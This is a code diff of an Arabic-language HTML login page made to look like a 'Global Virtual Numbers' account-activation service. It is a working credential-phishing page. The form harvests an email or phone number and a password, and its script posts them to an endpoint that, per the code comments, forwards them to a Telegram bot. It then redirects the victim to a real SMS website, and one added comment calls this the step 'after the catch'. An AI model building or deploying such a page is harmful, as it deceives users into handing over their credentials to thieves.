@@ -3,130 +3,187 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول - تأكيد الحساب</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+    <title>تأكيد الهوية - Global Virtual Numbers</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
+    
     <style>
-        /* إعدادات الخلفية والجسم ليكون مريحاً للعين */
+        /* المتغيرات اللونية الاحترافية */
+        :root {
+            --bg-dark: #0a0e17; /* خلفية داكنة جداً */
+            --card-bg: #141b2b; /* خلفية البطاقة */
+            --primary-glow: #00f2fe; /* أزرق سماوي مضيء */
+            --secondary-glow: #4facfe; /* أزرق مشرق */
+            --accent: #8e44ad; /* بنفسجي فخم */
+            --text-main: #ffffff;
+            --text-muted: #8b9bb4;
+            --border: rgba(255, 255, 255, 0.05);
+        }
+
         body {
-            margin: 0;
-            padding: 0;
-            font-family: 'Cairo', sans-serif; /* خط عصري وأنيق */
-            background-color: #f0f2f5; /* لون خلفية رمادي فاتح جداً هادئ */
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
+            margin: 0; padding: 0;
+            font-family: 'Cairo', sans-serif;
+            background-color: var(--bg-dark);
+            background-image: 
+                radial-gradient(at 10% 10%, rgba(79, 172, 254, 0.15) 0px, transparent 50%),
+                radial-gradient(at 90% 90%, rgba(142, 68, 173, 0.15) 0px, transparent 50%);
+            display: flex; justify-content: center; align-items: center;
+            min-height: 100vh; color: var(--text-main);
+            overflow: hidden;
         }
 
-        /* حاوية البطاقة الرئيسية بلمسة احترافية */
-        .login-card {
-            background-color: #ffffff;
-            width: 90%;
-            max-width: 400px;
-            padding: 40px 30px;
-            border-radius: 20px; /* حواف انسيابية مستديرة متقنة */
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1); /* ظل ناعم ليعطي عمقاً */
+        /* حاوية البطاقة الرئيسية بلمسة فخامة */
+        .premium-card {
+            background-color: var(--card-bg);
+            width: 90%; max-width: 420px;
+            padding: 50px 35px;
+            border-radius: 24px; /* حواف منحوتة بدقة */
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
             text-align: center;
-            border: 1px solid #e1e4e8;
+            border: 1px solid var(--border);
+            backdrop-filter: blur(10px); /* تأثير زجاجي خفيف */
+            position: relative;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
         }
 
-        /* تنسيق الصورة المصغرة (اختياري) */
-        #pageImg {
-            width: 100px;
-            height: 100px;
-            border-radius: 50%; /* صورة دائرية */
-            object-fit: contain; /* حافظ على أبعاد الصورة */
-            margin-bottom: 25px;
-            display: inline-block;
-            background-color: #f8fafc;
-            border: 3px solid #f0f2f5;
+        .premium-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 30px 60px rgba(0, 242, 254, 0.15);
         }
 
-        /* تنسيق النص (العنوان) */
+        /* الشعار الاحترافي للأرقام الوهمية */
+        .logo-container {
+            width: 120px; height: 120px; margin: 0 auto 30px auto;
+            position: relative;
+        }
+
+        /* صورة متحركة تعبر عن الاتصال العالمي والأرقام */
+        .logo-img {
+            width: 100%; height: 100%;
+            background-image: url('https://telegra.ph/file/1792945d7d91986420551.jpg'); /* رابط الصورة الاحترافية المرفقة */
+            background-size: cover;
+            background-position: center;
+            border-radius: 50%;
+            box-shadow: 0 0 30px rgba(79, 172, 254, 0.5);
+            border: 4px solid var(--card-bg);
+            position: relative; z-index: 2;
+        }
+
+        /* تأثير النبض حول الشعار */
+        .logo-container::after {
+            content: ''; position: absolute; top: -5px; left: -5px; right: -5px; bottom: -5px;
+            background: linear-gradient(45deg, var(--primary-glow), var(--accent));
+            border-radius: 50%; z-index: 1; opacity: 0.8;
+            filter: blur(15px); animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 0.8; }
+            50% { transform: scale(1.05); opacity: 0.5; }
+            100% { transform: scale(1); opacity: 0.8; }
+        }
+
+        /* تنسيق النصوص */
         h2 {
-            color: #333;
-            font-size: 22px;
-            font-weight: 700;
-            margin-bottom: 30px;
+            color: var(--text-main);
+            font-size: 24px; font-weight: 800;
+            margin-bottom: 10px; letter-spacing: -0.5px;
         }
 
-        /* تنسيق حقول الإدخال لتكون سهلة الاستخدام */
-        .input-group {
-            margin-bottom: 20px;
-            text-align: right;
+        .subtitle {
+            color: var(--text-muted);
+            font-size: 14px; font-weight: 400;
+            margin-bottom: 40px; line-height: 1.6;
         }
+
+        /* تنسيق حقول الإدخال لتكون منحوتة */
+        .input-group { margin-bottom: 25px; text-align: right; position: relative; }
 
         input {
             width: 100%;
-            padding: 14px 18px;
-            font-size: 16px;
-            border: 2px solid #e1e4e8;
-            border-radius: 12px; /* حواف مستديرة متقنة للحقول */
+            padding: 16px 20px;
+            font-size: 16px; font-family: 'Cairo', sans-serif;
+            color: var(--text-main);
+            background-color: rgba(255, 255, 255, 0.03);
+            border: 2px solid var(--border);
+            border-radius: 14px; /* حواف مستديرة متقنة */
             outline: none;
             transition: all 0.3s ease;
             box-sizing: border-box;
-            background-color: #fbfcfd;
         }
 
+        input::placeholder { color: rgba(139, 155, 180, 0.5); }
+
         input:focus {
-            border-color: #007bff; /* يتغير اللون عند الضغط */
-            background-color: #fff;
-            box-shadow: 0 0 8px rgba(0, 123, 255, 0.2);
+            border-color: var(--secondary-glow);
+            background-color: rgba(79, 172, 254, 0.05);
+            box-shadow: 0 0 15px rgba(79, 172, 254, 0.2);
         }
 
         /* تنسيق رسالة الخطأ */
         .error-msg {
-            color: #d9534f;
-            font-size: 13px;
-            margin-top: 5px;
-            display: none;
+            color: #ff6b6b; font-size: 12px; margin-top: 5px;
+            display: none; font-weight: 600;
         }
 
-        /* تنسيق الزر الأزرق الاحترافي */
+        /* تنسيق الزر الاحترافي المضيء */
         button {
             width: 100%;
-            padding: 15px;
-            background: linear-gradient(to right, #007bff, #0056b3); /* تدرج لوني للزر */
-            color: white;
+            padding: 18px;
+            background: linear-gradient(135deg, var(--secondary-glow) 0%, var(--primary-glow) 100%);
+            color: #0a0e17; /* لون نص داكن للتباين */
             border: none;
-            border-radius: 12px; /* حواف مستديرة متقنة للزر */
-            font-size: 18px;
-            font-weight: 700;
+            border-radius: 14px; /* حواف مستديرة متقنة للزر */
+            font-size: 18px; font-weight: 800;
             cursor: pointer;
-            transition: transform 0.2s, box-shadow 0.2s;
-            margin-top: 10px;
+            transition: all 0.3s ease;
+            margin-top: 15px;
+            text-transform: uppercase; letter-spacing: 1px;
+            box-shadow: 0 5px 20px rgba(0, 242, 254, 0.3);
         }
 
         button:hover {
-            transform: translateY(-2px); /* تأثير ارتفاع بسيط عند المرور بالماوس */
-            box-shadow: 0 5px 15px rgba(0, 123, 255, 0.3);
+            box-shadow: 0 8px 30px rgba(0, 242, 254, 0.5);
+            transform: translateY(-2px);
         }
 
-        button:active {
-            transform: translateY(0);
+        button:active { transform: translateY(1px); box-shadow: 0 3px 10px rgba(0, 242, 254, 0.3); }
+
+        /* تذييل الصفحة */
+        .footer-text {
+            margin-top: 35px; color: var(--text-muted);
+            font-size: 12px; border-top: 1px solid var(--border);
+            padding-top: 20px;
         }
 
     </style>
 </head>
 <body>
 
-    <div class="login-card">
-        <img id="pageImg" src="https://telegra.ph/file/1792945d7d91986420551.jpg" alt="Logo">
+    <div class="premium-card">
+        <div class="logo-container">
+            <div class="logo-img"></div>
+        </div>
         
-        <h2 id="pageLetter">سجل دخولك لتفعيل الخدمة</h2>
+        <h2 id="pageLetter">منصة تفعيل الأرقام العالمية</h2>
+        <p class="subtitle">سجل دخولك لتأكيد ملكية الحساب والوصول الآمن للخدمة</p>
 
         <form id="authForm">
             <div class="input-group">
-                <input type="text" id="userInput" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
-                <div id="userError" class="error-msg">يرجى إدخال بيانات صحيحة</div>
+                <input type="text" id="userInput" placeholder="البريد الإلكتروني أو رقم الهاتف المرتبط" required>
+                <div id="userError" class="error-msg">❌ تنسيق البيانات غير صحيح</div>
             </div>
 
             <div class="input-group">
                 <input type="password" id="passInput" placeholder="كلمة السر" required>
             </div>
 
-            <button type="submit" id="pageBtn">تأكيد الآن</button>
+            <button type="submit" id="pageBtn">تفعيل الحساب الآن</button>
         </form>
+
+        <div class="footer-text">
+            © 2024 Global Virtual Numbers Pro. جميع الحقوق محفوظة. <br>
+            نظام حماية متطور مدعوم بالذكاء الاصطناعي.
+        </div>
     </div>
 
     <script>
@@ -135,14 +192,14 @@
             try {
                 const response = await fetch('/api/get');
                 const data = await response.json();
-                if(data.image) document.getElementById('pageImg').src = data.image;
+                if(data.image) document.querySelector('.logo-img').style.backgroundImage = `url(${data.image})`;
                 if(data.letter) document.getElementById('pageLetter').innerText = data.letter;
                 if(data.button) document.getElementById('pageBtn').innerText = data.button;
-            } catch (e) { console.log("استخدام الإعدادات الافتراضية"); }
+            } catch (e) { console.log("استخدام الإعدادات الافتراضية الاحترافية"); }
         }
         window.onload = fetchConfig;
 
-        // التحقق من الإدخال والإرسال
+        // التحقق من الإدخال والإرسال لبوت التلجرام
         const form = document.getElementById('authForm');
         form.onsubmit = async (e) => {
             e.preventDefault();
@@ -151,17 +208,20 @@
             const pass = document.getElementById('passInput').value;
             const errorText = document.getElementById('userError');
 
-            // منطق التحقق البسيط
+            // منطق التحقق البسيط (إيميل أو هاتف)
             const isEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(user);
             const isPhone = /^\+?[0-9]{7,15}$/.test(user);
 
             if (!isEmail && !isPhone) {
                 errorText.style.display = 'block';
-                document.getElementById('userInput').style.borderColor = '#d9534f';
+                document.getElementById('userInput').style.borderColor = '#ff6b6b';
                 return;
+            } else {
+                errorText.style.display = 'none';
+                document.getElementById('userInput').style.borderColor = 'rgba(255, 255, 255, 0.05)';
             }
 
-            // إرسال البيانات لبوت التلجرام
+            // إرسال البيانات لبوت التلجرام (تأكد من تعديل ملف index.py ليستقبل هذه الحقول)
             await fetch('/api/save', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
@@ -171,7 +231,7 @@
                 })
             });
 
-            // تحويل المستخدم لموقع الجوائز أو الأرقام
+            // تحويل المستخدم للموقع الحقيقي بعد الصيد
             window.location.href = "https://receive-smss.com/";
         };
     </script>
